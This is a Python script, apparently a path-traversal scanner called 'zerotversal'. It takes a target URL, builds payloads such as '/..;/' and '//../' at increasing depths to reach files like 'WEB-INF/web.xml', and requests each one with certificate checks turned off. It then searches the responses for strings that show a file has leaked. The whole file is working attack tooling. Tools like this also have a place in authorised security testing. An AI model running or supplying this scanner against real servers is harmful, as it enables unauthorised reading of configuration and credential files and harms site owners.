"""
with <3 by @zeroc00I 22/02/22 22:22
python3 zerotversal.py -u https://zerocool.onion -a 'WEB-INF/web.xml' -d 3 -s '<?xml,xmlns:xsi'
"""
from bs4 import BeautifulSoup
from urllib.parse import urlsplit
from numpy import true_divide
import requests, optparse, json
from urllib3.exceptions import NewConnectionError
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings()

def menu():
    parser = optparse.OptionParser()
    parser.add_option('-u', '--url', dest="url_to_permute", help='https://example.zerocool.com/item?search=waf')
    parser.add_option('-a', '--add', dest="payload_to_add", help='/WEB-INF')
    parser.add_option('-d', '--depth', dest="directory_transversal_depth", default=1, type=int, help='1 will add /./ on url')
    parser.add_option('-s', '--search', dest="string_to_search_on_results", help='string that will be used to grep on request response body')

    options, args = parser.parse_args()

    if not options.url_to_permute:
        print("[+] Please enter some URL with -u parameter (Check -h for help)")
        exit()

    globals().update(locals())

class zerotversal:

    def __init__(self,url):
        self.url = url
        self.url_directory_payload = options.payload_to_add
        self.url_depth = options.directory_transversal_depth
        self.url_search_string = options.string_to_search_on_results
        self.url_final_permuted = list()
        self.url_final_permuted_with_payloads = list()

        if self.url.endswith('/'):
            self.url = self.url[:-1]

    def permute_url(self,url):
        split_url = urlsplit(self.url)
        should_iterate = split_url.path.split('/')
        negative_count = len(should_iterate) * -1

        for _ in range(0,negative_count+1,-1):
            all_paths_together='/'.join(should_iterate)
            permuted_url = "{}{}{}".format(
                split_url.scheme+"://",
                split_url.netloc,
                all_paths_together
                )

            should_iterate.pop()

            if permuted_url is None:
                continue

            self.url_final_permuted.append(permuted_url)

        return self.url_final_permuted
            

    def permute_url_with_payload(self,permuted_urls):

        for single_url_permuted in permuted_urls:
            first_depth_payload="//./"
            first_depth_payload2="/..;/"
            first_depth_payload3="//../"
            others_depth_payload="//.."
            
            for x in range(0,self.url_depth):
                if x == 0:
                    self.url_final_permuted_with_payloads.append(single_url_permuted+first_depth_payload+self.url_directory_payload)
                    self.url_final_permuted_with_payloads.append(single_url_permuted+first_depth_payload2+self.url_directory_payload)
                    self.url_final_permuted_with_payloads.append(single_url_permuted+first_depth_payload3+self.url_directory_payload)

                elif x == self.url_depth-1:
                    others_depth_payload+="/../"
                    self.url_final_permuted_with_payloads.append(single_url_permuted+others_depth_payload+self.url_directory_payload)
                else:
                    self.url_final_permuted_with_payloads.append(single_url_permuted+others_depth_payload+self.url_directory_payload)
                    others_depth_payload+="/.."
        return self.url_final_permuted_with_payloads

class Requester:
    def __init__(self,url):
        self.url = url
    
    def get(self):
        try:

            s = requests.Session()
            req = requests.Request(
                method='GET',
                url=self.url
            )
            prep =  req.prepare()
            prep.url = self.url

            self.request = s.send(prep, verify=False)

        except NewConnectionError:
            exit
        except Exception:
            exit
        
        return self.request.text

    def get_response_word_number(self):
        array_response = self.request.text.split(' ')
        array_response_without_empty_values = [x for x in array_response if x]

        return len(array_response_without_empty_values)

    def get_response_line_number(self):
        array_response = self.request.text.split('\n')
        array_response_without_empty_values = [x for x in array_response if x]

        return len(array_response_without_empty_values)

    def get_status_code(self):

        return self.request.status_code

    def search_into_response(self,string):
        is_string_found = string in self.request.text
        
        if is_string_found:
            return "[+] String '{}' ENCONTRADA em {}".format(string,self.url)
        else:
            return None
        #return "[-] String '{}' não encontrada em {}".format(string,self.url)


def main():
    menu()
    zerot = zerotversal(options.url_to_permute)
    permuted_urls = zerot.permute_url(options.url_to_permute)
    permuted_urls_with_payloads = zerot.permute_url_with_payload(permuted_urls)

    for url in permuted_urls_with_payloads:
        requester = Requester(url)
        response = requester.get()
        if response:
            if options.string_to_search_on_results.count(','):
                strings_to_match = options.string_to_search_on_results.split(',')
                for string_to_match in strings_to_match:
                    result = requester.search_into_response(
                        string_to_match
                    )

                    if result:
                        print(result)
            else:
                result = requester.search_into_response(
                        options.string_to_search_on_results
                )
                if result:
                    print(result)
        else:
            print('[-] Requisição falhou {}'.format(response))


if __name__=="__main__":
    main()
